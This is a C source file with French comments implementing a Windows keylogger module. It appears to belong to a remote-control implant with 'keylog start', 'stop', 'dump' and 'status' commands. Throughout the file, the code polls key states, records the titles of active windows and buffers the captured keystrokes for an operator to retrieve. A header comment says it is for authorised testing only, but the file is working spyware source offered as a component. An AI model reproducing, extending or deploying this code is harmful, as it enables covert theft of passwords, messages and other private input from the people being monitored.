#include "keylog.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/**
 * Module Keylogger - Implémentation
 *
 * NOTES DE SÉCURITÉ:
 * - GetAsyncKeyState() est surveillé par les EDR
 * - Capture de frappes = comportement malveillant évident
 * - Les antivirus détectent généralement ce pattern
 * - À utiliser uniquement dans un contexte de test autorisé
 */

// État du keylogger
static HANDLE g_keylog_thread = NULL;
static volatile BOOL g_keylog_running = FALSE;
static HANDLE g_keylog_mutex = NULL;

// Buffer de capture
static char g_keylog_buffer[KEYLOG_BUFFER_SIZE];
static size_t g_keylog_buffer_pos = 0;

// Dernière fenêtre active capturée
static char g_last_window[256] = {0};

/**
 * Ajoute une string au buffer (thread-safe)
 */
static void keylog_append(const char *text) {
    WaitForSingleObject(g_keylog_mutex, INFINITE);

    size_t len = strlen(text);
    if (g_keylog_buffer_pos + len < KEYLOG_BUFFER_SIZE - 1) {
        strcat(g_keylog_buffer, text);
        g_keylog_buffer_pos += len;
    }

    ReleaseMutex(g_keylog_mutex);
}

/**
 * Récupère le titre de la fenêtre active
 */
static void get_active_window_title(char *title, size_t size) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, (int)size);
    } else {
        strcpy(title, "[Unknown]");
    }
}

/**
 * Traduit un code de touche virtuelle en string
 */
static const char* translate_key(int vk_code) {
    // Touches spéciales
    switch (vk_code) {
        case VK_RETURN: return "[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";  // Ignoré (capturé via GetKeyState)
        case VK_CONTROL: return "";
        case VK_MENU: return "";  // ALT
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return " ";
        case VK_PRIOR: return "[PAGEUP]";
        case VK_NEXT: return "[PAGEDOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DELETE]";
        case VK_LWIN: return "[WIN]";
        case VK_RWIN: return "[WIN]";

        // Touches F1-F12
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";

        default:
            return NULL;  // Touche normale, nécessite traduction
    }
}

/**
 * Thread de capture des frappes
 */
static DWORD WINAPI keylog_thread_func(LPVOID param) {
    (void)param;

    char window_title[256];
    char key_buffer[16];

    // Marquer le démarrage
    time_t start_time = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "[Keylog started: %Y-%m-%d %H:%M:%S]\n", localtime(&start_time));
    keylog_append(timestamp);

    while (g_keylog_running) {
        // Vérifier la fenêtre active
        get_active_window_title(window_title, sizeof(window_title));

        // Si la fenêtre a changé, l'enregistrer
        if (strcmp(window_title, g_last_window) != 0 && strlen(window_title) > 0) {
            strncpy(g_last_window, window_title, sizeof(g_last_window) - 1);

            char context[512];
            time_t now = time(NULL);
            strftime(timestamp, sizeof(timestamp), "%H:%M:%S", localtime(&now));
            snprintf(context, sizeof(context), "\n[%s | %s]\n", timestamp, window_title);
            keylog_append(context);
        }

        // Scanner toutes les touches (A-Z, 0-9, symboles)
        for (int vk = 8; vk <= 190; vk++) {
            // Vérifier si la touche est pressée (bit le plus haut)
            if (GetAsyncKeyState(vk) & 0x8000) {
                const char *special = translate_key(vk);

                if (special) {
                    // Touche spéciale
                    if (strlen(special) > 0) {
                        keylog_append(special);
                    }
                } else {
                    // Touche normale - convertir avec ToAscii
                    BYTE keyboard_state[256];
                    GetKeyboardState(keyboard_state);

                    WORD ascii_value;
                    int result = ToAscii(vk, MapVirtualKey(vk, 0), keyboard_state, &ascii_value, 0);

                    if (result == 1) {
                        // Caractère ASCII valide
                        key_buffer[0] = (char)(ascii_value & 0xFF);
                        key_buffer[1] = '\0';
                        keylog_append(key_buffer);
                    }
                }

                // Attendre que la touche soit relâchée pour éviter les répétitions
                while (GetAsyncKeyState(vk) & 0x8000) {
                    Sleep(10);
                }
            }
        }

        // Petite pause pour éviter 100% CPU
        Sleep(10);
    }

    // Marquer l'arrêt
    time_t end_time = time(NULL);
    strftime(timestamp, sizeof(timestamp), "[Keylog stopped: %Y-%m-%d %H:%M:%S]\n", localtime(&end_time));
    keylog_append(timestamp);

    return 0;
}

/**
 * Démarre le keylogger
 */
int keylog_start(char *output, size_t size) {
    output[0] = '\0';

    // Vérifier si déjà en cours
    if (g_keylog_running) {
        snprintf(output, size, "[-] Keylogger already running\n");
        return KEYLOG_ERROR_ALREADY_RUNNING;
    }

    // Créer le mutex si nécessaire
    if (!g_keylog_mutex) {
        g_keylog_mutex = CreateMutex(NULL, FALSE, NULL);
        if (!g_keylog_mutex) {
            snprintf(output, size, "[-] Failed to create mutex\n");
            return KEYLOG_ERROR_THREAD;
        }
    }

    // Lancer le thread
    g_keylog_running = TRUE;
    g_keylog_thread = CreateThread(NULL, 0, keylog_thread_func, NULL, 0, NULL);

    if (!g_keylog_thread) {
        g_keylog_running = FALSE;
        snprintf(output, size, "[-] Failed to create keylog thread\n");
        return KEYLOG_ERROR_THREAD;
    }

    snprintf(output, size,
             "[+] Keylogger started\n"
             "[*] Capturing keystrokes in background\n"
             "[*] Use 'keylog dump' to retrieve logs\n"
             "[!] WARNING: Highly suspicious activity");

    return KEYLOG_SUCCESS;
}

/**
 * Arrête le keylogger
 */
int keylog_stop(char *output, size_t size) {
    output[0] = '\0';

    if (!g_keylog_running) {
        snprintf(output, size, "[-] Keylogger not running\n");
        return KEYLOG_ERROR_NOT_RUNNING;
    }

    // Arrêter le thread
    g_keylog_running = FALSE;

    // Attendre la fin du thread (max 2 secondes)
    if (g_keylog_thread) {
        WaitForSingleObject(g_keylog_thread, 2000);
        CloseHandle(g_keylog_thread);
        g_keylog_thread = NULL;
    }

    snprintf(output, size,
             "[+] Keylogger stopped\n"
             "[*] %zu bytes captured\n"
             "[*] Use 'keylog dump' to retrieve logs",
             g_keylog_buffer_pos);

    return KEYLOG_SUCCESS;
}

/**
 * Récupère et vide le buffer
 */
int keylog_dump(char *output, size_t size) {
    output[0] = '\0';

    WaitForSingleObject(g_keylog_mutex, INFINITE);

    if (g_keylog_buffer_pos == 0) {
        snprintf(output, size, "[*] No keystrokes captured yet\n");
        ReleaseMutex(g_keylog_mutex);
        return KEYLOG_SUCCESS;
    }

    // Copier le buffer vers l'output (limité par la taille de l'output)
    size_t to_copy = g_keylog_buffer_pos;
    if (to_copy >= size - 100) {
        to_copy = size - 100;
    }

    snprintf(output, size,
             "[Keylog Dump - %zu bytes]\n"
             "═══════════════════════════════════════════════════════════\n"
             "%.*s\n"
             "═══════════════════════════════════════════════════════════\n",
             g_keylog_buffer_pos,
             (int)to_copy,
             g_keylog_buffer);

    // Vider le buffer
    memset(g_keylog_buffer, 0, sizeof(g_keylog_buffer));
    g_keylog_buffer_pos = 0;

    ReleaseMutex(g_keylog_mutex);

    return KEYLOG_SUCCESS;
}

/**
 * Statut du keylogger
 */
int keylog_status(char *output, size_t size) {
    output[0] = '\0';

    WaitForSingleObject(g_keylog_mutex, INFINITE);

    if (g_keylog_running) {
        snprintf(output, size,
                 "[*] Keylogger Status: ACTIVE\n"
                 "[*] Buffer size: %zu / %d bytes (%.1f%%)\n"
                 "[*] Last window: %s\n",
                 g_keylog_buffer_pos,
                 KEYLOG_BUFFER_SIZE,
                 (float)g_keylog_buffer_pos / KEYLOG_BUFFER_SIZE * 100.0f,
                 strlen(g_last_window) > 0 ? g_last_window : "[None]");
    } else {
        snprintf(output, size,
                 "[*] Keylogger Status: STOPPED\n"
                 "[*] Buffer size: %zu bytes\n",
                 g_keylog_buffer_pos);
    }

    ReleaseMutex(g_keylog_mutex);

    return KEYLOG_SUCCESS;
}
